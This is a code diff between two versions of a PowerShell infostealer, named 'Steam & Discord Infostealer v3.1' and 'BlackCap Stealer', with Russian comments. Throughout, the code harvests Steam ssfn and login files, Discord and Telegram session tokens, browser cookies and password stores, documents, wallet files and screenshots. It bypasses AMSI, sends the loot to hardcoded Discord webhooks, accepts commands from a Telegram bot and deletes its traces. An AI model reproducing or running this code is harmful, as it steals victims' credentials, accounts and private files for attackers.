@@ -1,151 +1,327 @@
-# Steam & Discord Infostealer v3.1 - Token Grabber
-# Set parameters
-$discordWebhook = "https://discord.com/api/webhooks/1403726405723754517/OnVsq_eilkHZ5xUvI_VxNjrEjwGi01EQko3GRUEdcl-iLj6x6om1ZUl9c0IY05eKxxWJ"
-$telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
-$telegramChatID = "YOUR_TELEGRAM_CHAT_ID"
-$tempDir = "$env:TEMP\SteamLogs"
-$zipPath = "$env:TEMP\SteamData_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+# BlackCap Stealer - Простой и эффективный
+# Одна команда: irm <ссылка> | iex
 
-# 1. Function to capture PowerShell command history
-function Get-CommandHistory {
-    Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File "$tempDir\PowerShell_History.txt"
-}
+$webhook = "https://discord.com/api/webhooks/1408438938825261061/YXYXSKpdkkthcKDbB2PR8A8wRrWBGm5h4bbRTFy1j-50cN3xFNE_Z_Bt9nfNDCzWdFkF"
 
-# 2. Function to steal Steam files & configs for FULL ACCESS
-function Get-SteamData {
-    $steamPaths = @("$env:ProgramFiles(x86)\Steam", "${env:ProgramFiles}\Steam", "$env:USERPROFILE\AppData\Local\Steam")
-    foreach ($path in $steamPaths) {
-        if (Test-Path $path) {
-            # Copy entire config directory
-            Copy-Item "$path\config\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-            # Copy all ssfn files (Steam guard)
-            Copy-Item "$path\ssfn*" $tempDir -Force -ErrorAction SilentlyContinue
-            # Copy loginusers.vdf and all userdata
-            Copy-Item "$path\logs\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-            Copy-Item "$path\userdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-        }
-    }
-}
+# AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# 3. NEW FUNCTION: Dedicated Steam Token Grabber
-function Get-SteamTokens {
-    $tokenFile = "$tempDir\Steam_Tokens.txt"
-    "=== Steam Tokens & Session Data ===`r`n" | Out-File $tokenFile -Append
-
-    # A. Extract from Registry
-    "Registry Tokens:`r`n" | Out-File $tokenFile -Append
+# Функция отправки на Discord
+function Send-Discord {
+    param([string]$content)
     try {
-        $regPath = "HKCU:\Software\Valve\Steam"
-        $regKeys = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
-        $regKeys | Out-File $tokenFile -Append
-    } catch {}
+        $payload = @{ content = $content } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10
+    } catch { }
+}
 
-    # B. Extract from config files
-    "`r`nConfig File Data:`r`n" | Out-File $tokenFile -Append
-    $configFiles = Get-ChildItem -Path $tempDir -Include *.vdf -Recurse
-    foreach ($file in $configFiles) {
-        if ($file.Name -like "*loginusers*" -or $file.Name -like "*config*") {
-            "--- $($file.Name) ---" | Out-File $tokenFile -Append
-            Get-Content $file.FullName | Out-File $tokenFile -Append
-        }
-    }
+# Функция отправки файла
+function Send-File {
+    param([string]$filePath)
+    try {
+        $bytes = [System.IO.File]::ReadAllBytes($filePath)
+        $base64 = [System.Convert]::ToBase64String($bytes)
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+        $payload = @{ 
+            file = $base64
+            filename = $fileName
+        } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 30
+    } catch { }
+}
 
-    # C. Extract from process memory (active sessions)
-    "`r`nActive Session Info:`r`n" | Out-File $tokenFile -Append
-    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
-    if ($steamProcess) {
-        netstat -ano | findstr ":$steamProcess.Id" | Out-File $tokenFile -Append
-        $steamProcess.Modules | Where-Object {$_.ModuleName -like "*steam*"} | Select-Object ModuleName, FileName | Out-File $tokenFile -Append
+# Функция создания ZIP
+function Create-Zip {
+    param([string]$sourcePath, [string]$zipPath)
+    try {
+        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($sourcePath, $zipPath)
+        return $true
+    } catch {
+        return $false
     }
 }
 
-# 4. Function to steal Telegram sessions
-function Get-TelegramData {
-    $telegramPaths = @("$env:USERPROFILE\AppData\Roaming\Telegram Desktop", "$env:USERPROFILE\Documents\Telegram Desktop")
-    foreach ($path in $telegramPaths) {
-        if (Test-Path $path) {
-            # Target tdata directory for session hijacking
-            Copy-Item "$path\tdata\*" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+# Функция кражи Steam
+function Get-SteamData {
+    $steamPaths = @(
+        "${env:ProgramFiles(x86)}\Steam",
+        "${env:ProgramFiles}\Steam", 
+        "${env:LOCALAPPDATA}\Steam"
+    )
+    
+    $steamPath = $steamPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+    if (!$steamPath) { return "Steam: Not found" }
+    
+    $data = "**Steam Data**`n"
+    $data += "Path: $steamPath`n"
+    
+    # SSFN файлы
+    $ssfnFiles = Get-ChildItem "$steamPath\ssfn*" -ErrorAction SilentlyContinue
+    if ($ssfnFiles) {
+        $data += "SSFN Files: $($ssfnFiles.Count) found`n"
+        $ssfnFiles | ForEach-Object { $data += "- $($_.Name)`n" }
+    }
+    
+    # loginusers.vdf
+    $loginusers = "$steamPath\config\loginusers.vdf"
+    if (Test-Path $loginusers) {
+        $content = Get-Content $loginusers -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+        if ($content) {
+            $data += "LoginUsers: Found`n"
+            $data += "Content: $($content.Substring(0, [Math]::Min(500, $content.Length)))...`n"
         }
     }
+    
+    # config.vdf
+    $config = "$steamPath\config\config.vdf"
+    if (Test-Path $config) {
+        $data += "Config: Found`n"
+    }
+    
+    return $data
 }
 
-# 5. Function to steal cookies & passwords from all browsers
+# Функция кражи браузеров
 function Get-BrowserData {
-    $browsers = @("Chrome", "MicrosoftEdge", "Firefox", "Opera", "YandexBrowser")
-    foreach ($browser in $browsers) {
-        try {
-            $dataPath = "$env:USERPROFILE\AppData\Local\$browser\User Data\Default"
-            if (Test-Path $dataPath) {
-                Copy-Item "$dataPath\Cookies" "$tempDir\${browser}_Cookies" -Force -ErrorAction SilentlyContinue
-                Copy-Item "$dataPath\Login Data" "$tempDir\${browser}_LoginData" -Force -ErrorAction SilentlyContinue
-                Copy-Item "$dataPath\Local Storage" "$tempDir\${browser}_LocalStorage" -Recurse -Force -ErrorAction SilentlyContinue
+    $data = "**Browser Data**`n"
+    
+    # Chrome
+    $chromePath = "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default"
+    if (Test-Path $chromePath) {
+        $data += "**Chrome**`n"
+        
+        # Cookies
+        $cookiesPath = "$chromePath\Network\Cookies"
+        if (Test-Path $cookiesPath) {
+            $data += "Cookies: Found`n"
+        }
+        
+        # Login Data
+        $loginPath = "$chromePath\Login Data"
+        if (Test-Path $loginPath) {
+            $data += "Passwords: Found`n"
+        }
+        
+        # History
+        $historyPath = "$chromePath\History"
+        if (Test-Path $historyPath) {
+            $data += "History: Found`n"
+        }
+        
+        # Web Data
+        $webDataPath = "$chromePath\Web Data"
+        if (Test-Path $webDataPath) {
+            $data += "Web Data: Found`n"
+        }
+    }
+    
+    # Edge
+    $edgePath = "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default"
+    if (Test-Path $edgePath) {
+        $data += "**Edge**`n"
+        
+        $cookiesPath = "$edgePath\Network\Cookies"
+        if (Test-Path $cookiesPath) {
+            $data += "Cookies: Found`n"
+        }
+        
+        $loginPath = "$edgePath\Login Data"
+        if (Test-Path $loginPath) {
+            $data += "Passwords: Found`n"
+        }
+        
+        $historyPath = "$edgePath\History"
+        if (Test-Path $historyPath) {
+            $data += "History: Found`n"
+        }
+    }
+    
+    # Firefox
+    $firefoxPath = "${env:APPDATA}\Mozilla\Firefox\Profiles"
+    if (Test-Path $firefoxPath) {
+        $data += "**Firefox**`n"
+        $profiles = Get-ChildItem $firefoxPath -Directory
+        foreach ($profile in $profiles) {
+            $cookiesPath = "$($profile.FullName)\cookies.sqlite"
+            if (Test-Path $cookiesPath) {
+                $data += "Cookies: Found in $($profile.Name)`n"
             }
-        } catch {}
+            
+            $loginsPath = "$($profile.FullName)\logins.json"
+            if (Test-Path $loginsPath) {
+                $data += "Logins: Found in $($profile.Name)`n"
+            }
+        }
     }
+    
+    return $data
 }
 
-# 6. Collect system info and network data
+# Функция кражи Discord
+function Get-DiscordData {
+    $data = "**Discord Data**`n"
+    
+    $discordPaths = @(
+        "${env:APPDATA}\Discord",
+        "${env:LOCALAPPDATA}\Discord",
+        "${env:APPDATA}\discordcanary",
+        "${env:APPDATA}\discordptb"
+    )
+    
+    foreach ($path in $discordPaths) {
+        if (Test-Path $path) {
+            $leveldbPath = "$path\Local Storage\leveldb"
+            if (Test-Path $leveldbPath) {
+                $data += "Discord: $path`n"
+                
+                # Ищем токены в файлах
+                $files = Get-ChildItem $leveldbPath -File | Where-Object { $_.Name -like "*.ldb" -or $_.Name -like "*.log" }
+                foreach ($file in $files) {
+                    try {
+                        $content = Get-Content $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+                        if ($content -match "mfa\.[a-zA-Z0-9_-]{84}") {
+                            $data += "MFA Token: $($matches[0])`n"
+                        }
+                        if ($content -match "[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27}") {
+                            $data += "Token: $($matches[0])`n"
+                        }
+                    } catch { }
+                }
+            }
+        }
+    }
+    
+    return $data
+}
+
+# Функция системной информации
 function Get-SystemInfo {
-    systeminfo | Out-File "$tempDir\SystemInfo.txt"
-    (Get-WmiObject -Class Win32_ComputerSystem).Model | Out-File "$tempDir\PC_Model.txt"
-    ipconfig /all | Out-File "$tempDir\Network_Info.txt"
-    netstat -ano | Out-File "$tempDir\Open_Ports.txt"
+    $data = "**System Info**`n"
+    
+    $data += "Username: $env:USERNAME`n"
+    $data += "Computer: $env:COMPUTERNAME`n"
+    $data += "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
+    $data += "Architecture: $env:PROCESSOR_ARCHITECTURE`n"
+    $data += "Admin: $([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544')`n"
+    
+    # IP и локация
+    try {
+        $ip = (Invoke-RestMethod -Uri "https://ipinfo.io/json" -TimeoutSec 5).ip
+        $data += "IP: $ip`n"
+    } catch { }
+    
+    return $data
 }
 
-# 7. Create a ZIP archive of all stolen data
-function Compress-Data {
-    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
-}
-
-# 8. Function to send data via Discord webhook
-function Send-DiscordWebhook {
-    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
-    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $bodyLines = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $zipPath -Leaf)`"",
-        "Content-Type: application/zip`r`n",
-        $fileEnc,
-        "--$boundary--"
-    ) -join "`r`n"
-    Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
-}
-
-# 9. Telegram bot control - Check for commands
-function Check-TelegramCommand {
-    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/getUpdates" -Method Get
-    $lastMessage = $updates.result[-1].message.text
-    if ($lastMessage -eq "/startsteal") {
-        Execute-Stealer
-        Send-DiscordWebhook
-        Send-TelegramMessage "Stealer executed. Data sent to Discord."
+# Функция скриншота
+function Get-Screenshot {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
+        
+        $tempPath = "$env:TEMP\screenshot.png"
+        $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        return $tempPath
+    } catch {
+        return $null
     }
 }
 
-# 10. Send message via Telegram
-function Send-TelegramMessage {
-    param($message)
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=$message" -Method Get
+# Функция кражи файлов
+function Get-ImportantFiles {
+    $data = "**Important Files**`n"
+    $filesToSteal = @()
+    
+    $paths = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Documents", 
+        "$env:USERPROFILE\Downloads"
+    )
+    
+    $extensions = @("*.txt", "*.doc", "*.docx", "*.pdf", "*.xls", "*.xlsx", "*.db", "*.sqlite", "*.wallet", "*.dat", "*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp")
+    
+    foreach ($path in $paths) {
+        if (Test-Path $path) {
+            foreach ($ext in $extensions) {
+                $files = Get-ChildItem $path -Filter $ext -Recurse -ErrorAction SilentlyContinue | Select-Object -First 5
+                if ($files) {
+                    $data += "$path ($ext): $($files.Count) files`n"
+                    foreach ($file in $files) {
+                        $data += "- $($file.Name) ($([Math]::Round($file.Length/1KB, 2)) KB)`n"
+                        $filesToSteal += $file.FullName
+                    }
+                }
+            }
+        }
+    }
+    
+    return $data, $filesToSteal
 }
 
-# Main execution
-function Execute-Stealer {
-    Get-CommandHistory
-    Get-SteamData
-    Get-SteamTokens
-    Get-TelegramData
-    Get-BrowserData
-    Get-SystemInfo
-    Compress-Data
+# Главная функция
+function Start-Stealer {
+    $report = "**BlackCap Stealer Report**`n"
+    $report += "Time: $(Get-Date)`n`n"
+    
+    # Собираем данные
+    $report += Get-SystemInfo
+    $report += "`n"
+    $report += Get-SteamData  
+    $report += "`n"
+    $report += Get-BrowserData
+    $report += "`n"
+    $report += Get-DiscordData
+    $report += "`n"
+    
+    $fileInfo, $files = Get-ImportantFiles
+    $report += $fileInfo
+    $report += "`n"
+    
+    # Отправляем отчет
+    Send-Discord $report
+    
+    # Создаем временную папку для файлов
+    $tempDir = "$env:TEMP\stolen_files"
+    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
+    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+    
+    # Копируем файлы
+    foreach ($file in $files) {
+        try {
+            $dest = "$tempDir\$([System.IO.Path]::GetFileName($file))"
+            Copy-Item $file $dest -Force
+        } catch { }
+    }
+    
+    # Создаем ZIP и отправляем
+    $zipPath = "$env:TEMP\stolen_data.zip"
+    if (Create-Zip $tempDir $zipPath) {
+        Send-File $zipPath
+        Remove-Item $zipPath -Force
+    }
+    
+    # Скриншот
+    $screenshot = Get-Screenshot
+    if ($screenshot) {
+        Send-File $screenshot
+        Remove-Item $screenshot -Force
+    }
+    
+    # Очищаем следы
+    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+    Start-Sleep 2
 }
 
-# Run once and wait for Telegram commands in a loop
-Execute-Stealer
-Send-DiscordWebhook
-while ($true) {
-    Check-TelegramCommand
-    Start-Sleep -Seconds 60
-}
+# Запускаем стиллер
+Start-Stealer
+
